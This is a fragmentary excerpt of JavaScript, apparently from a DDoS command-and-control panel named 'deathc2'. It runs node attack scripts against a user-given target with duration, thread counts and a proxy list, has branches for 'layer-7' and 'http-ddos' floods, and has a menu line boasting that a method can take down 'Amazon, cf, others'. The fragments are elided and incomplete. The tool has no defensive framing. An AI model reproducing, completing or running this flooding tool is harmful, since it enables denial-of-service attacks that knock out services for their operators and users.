   ...
   exec(`node ${metode} ${target} ${duration}`)
    ...
    sigma()
      ...
      sigma()
       ...
       exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'layer-7') {
       pushOngoing(target, methods, duration)
       exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'http-ddos') {
       pushOngoing(target, methods, duration)
       exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
...
Allah SWT
`
permen.question('\x1b[47m\x1b[31mroot\x1b[0m\x1b[31m✦\x1b[0m\x1b[47m\x1b[31mdeathc2\x1b[0m: ', (input) => {
...
|| lezkill    || Amazon, cf, others can be down
